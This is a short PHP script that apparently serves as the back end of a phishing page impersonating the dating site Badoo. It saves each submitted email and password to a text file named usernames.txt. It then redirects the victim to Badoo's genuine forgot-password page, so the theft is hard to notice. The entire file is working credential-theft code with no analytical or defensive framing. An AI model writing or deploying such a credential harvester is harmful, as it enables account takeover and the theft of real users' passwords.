<?php

file_put_contents("usernames.txt", "Badoo Username: " . $_POST['email'] . "\nPassword: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://badoo.com/forgot/');
exit();
?>